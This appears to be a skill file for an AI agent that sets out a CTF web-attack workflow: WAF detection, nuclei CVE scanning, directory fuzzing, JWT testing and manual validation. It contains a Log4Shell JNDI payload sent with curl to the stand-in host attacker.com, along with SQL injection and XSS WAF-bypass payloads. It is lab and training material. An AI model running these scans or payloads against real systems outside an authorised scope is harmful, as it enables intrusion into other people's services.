---
name: web-attack
description: |
  The workhorse. Web app attack chain: httpx → nuclei (CVE templates
  with EPSS/KEV enrichment) → ffuf → feroxbuster → sqlmap → jwt-tool
  → wafw00f. JSON output enforced, result cache + cross-tool dedup.
  Use when: "attack this web app", "find vulns", "scan the URLs",
  "what's vulnerable here". Routes from ctf-workflow → recon.
---

# web-attack

## Before you start

1. **Scope check** (via `ctf-workflow`).
2. **Recon must be done first.** If you don't have `httpx.json` with live URLs, run `recon` first.
3. **Result cache:** skip re-runs of the same tool+target within 24h.

## Step 1 — WAF detection (do this BEFORE everything else)

```bash
URLS=$(jq -r '.url' ${HACKING_LAB}/findings/ctf/$TGT/recon/httpx.json)
echo "$URLS" | wafw00f -o ${HACKING_LAB}/findings/ctf/$TGT/web-attack/wafw00f.json
```

If a WAF is detected, **reduce rate limits and tune payloads** (Step 7).

## Step 2 — nuclei with CVE templates (highest-value, fastest)

```bash
URLS=$(jq -r '. | select(.status_code==200) | .url' \
  ${HACKING_LAB}/findings/ctf/$TGT/recon/httpx.json)

# Full CVE + tech + exposure scan, JSON output
nuclei -l <(echo "$URLS") \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/cves/ \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/vulnerabilities/ \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/exposures/ \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/default-logins/ \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/misconfiguration/ \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/technologies/ \
  -severity critical,high,medium \
  -json -silent \
  -rate-limit 25 -bulk-size 25 -c 25 \
  -o ${HACKING_LAB}/findings/ctf/$TGT/web-attack/nuclei.json
```

**Time budget:** 5-15 min depending on target size. Adjust `-c` (concurrency) down if WAF detected.

## Step 3 — Offline triage (which findings matter most)

Rank by severity, matcher, template ID, and CVE tags from the local `nuclei.json`.
Do not call public CVE/EPSS/KEV APIs from the lab during CTF prep unless the human explicitly approves it.

```bash
jq -r '
  [.info.severity, .template_id, (.info.name // "no-name"), (.matched_at // .host // .url)]
  | @tsv
' ${HACKING_LAB}/findings/ctf/$TGT/web-attack/nuclei.json \
  | sort \
  > ${HACKING_LAB}/findings/ctf/$TGT/web-attack/triage.tsv

head -20 ${HACKING_LAB}/findings/ctf/$TGT/web-attack/triage.tsv
```

## Step 4 — Directory + parameter fuzzing

```bash
# Quick dir bust (ffuf with small wordlist for speed)
ffuf -u "https://$TGT/FUZZ" \
  -w ${HACKING_LAB}/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -mc 200,301,302,401,403 \
  -t 50 -p "0.05-0.2" \
  -o ${HACKING_LAB}/findings/ctf/$TGT/web-attack/ffuf-dirs.json \
  -of json -s

# Recursive (slower, deeper)
feroxbuster -u "https://$TGT" \
  -w ${HACKING_LAB}/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -d 5 \
  -o ${HACKING_LAB}/findings/ctf/$TGT/web-attack/feroxbuster.json
```

**Time budget:** 5-20 min total.

## Step 5 — Per-vuln-class targeted scans

```bash
# If SQLi hints (login forms, search boxes, ?id= params)
nuclei -l <(echo "$URLS") \
  -t ${HACKING_LAB}/wordlists/nuclei-templates/http/vulnerabilities/ \
  -tags sqli \
  -json -silent -o ${HACKING_LAB}/findings/ctf/$TGT/web-attack/nuclei-sqli.json

# If JWTs in headers
for url in $URLS; do
  jwt=$(curl -s "$url" | grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | head -1)
  if [ -n "$jwt" ]; then
    jwt-tool "$jwt" -T -v > ${HACKING_LAB}/findings/ctf/$TGT/web-attack/jwt-$url.txt
  fi
done
```

## Step 6 — Validate each finding manually

nuclei gives you candidates. For each critical/high finding:

```bash
# 1. Read the nuclei finding
nuclei -t ${HACKING_LAB}/wordlists/nuclei-templates/http/cves/2021/CVE-2021-44228.yaml \
  -u "$URL" -debug  # show full request/response

# 2. Reproduce with curl
curl -i "$URL" -H "User-Agent: ${jndi:ldap://attacker.com/}"

# 3. If reproducible, it's a real finding. Move to report-ctf.
```

**Never trust nuclei blindly.** Always reproduce. False positives are common.

## Step 7 — WAF bypass techniques (if WAF detected)

```sql
-- SQLi: case variation, comments, encoding
' OR 1=1-- -
' oR 1=1-- -
'/**/OR/**/1=1-- -
%27%20OR%201%3D1--

-- XSS: tag alternatives, encoding
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
jaVasCript:alert(1)
```

For each WAF, look up bypass techniques in `${HACKING_LAB}/wordlists/PayloadsAllTheThings/`.

## Step 8 — Cross-tool dedup + final surface

```bash
cd ${HACKING_LAB}/findings/ctf/$TGT/web-attack
# Dedupe findings by (type, target, param)
jq -s 'add | unique_by({type: .["type"]?, target: (.matched_at // .url // .host), param: (.["matched-at"] // .param) | tostring})' \
  *.json > deduped.json

# Top 10 to report
jq -r '. | "[\(.info.severity)] \(.info.name) - \(.matched_at // .url)"' deduped.json \
  | sort | head -10
```

## Result cache (skip if recent)

```bash
CACHE=${HACKING_LAB}/findings/ctf/$TGT/web-attack/.last-run
test -f $CACHE && [ $(find $CACHE -mmin -1440) ] && { echo "skipping — ran <24h ago"; exit 0; }
```

## Handoff

If you find a flag (`flag{...}`, `CTF{...}`), route to `report-ctf`. If you find a CVE you can chain (e.g. SQLi creds → admin panel), keep going — the chain is the finding.

## Output to vault

```bash
obsidian append file="Cybersecurity/CTFs/<CTF_NAME>/01 - Methodology.md" \
  content="- $(date +%Y-%m-%d) web-attack $TGT: $(jq -s 'length' deduped.json) findings, top: $(jq -r '.[0].info.name' deduped.json)"
```

## Common pitfalls

- **Running nuclei without -silent.** The terminal fills with progress bars. Use `-silent`.
- **ffuf without rate limiting.** Gets you banned. Always `-p "0.05-0.2"`.
- **Trusting nuclei findings.** Always reproduce with curl.
- **Skipping the WAF check.** Step 1 catches it BEFORE you get banned.
- **Not deduplicating.** nuclei + feroxbuster + ffuf often find the same thing 3x. Dedup before reporting.
- **Running too slow.** The CTF has time pressure. Tune `-c` and `-t` to fit your budget.
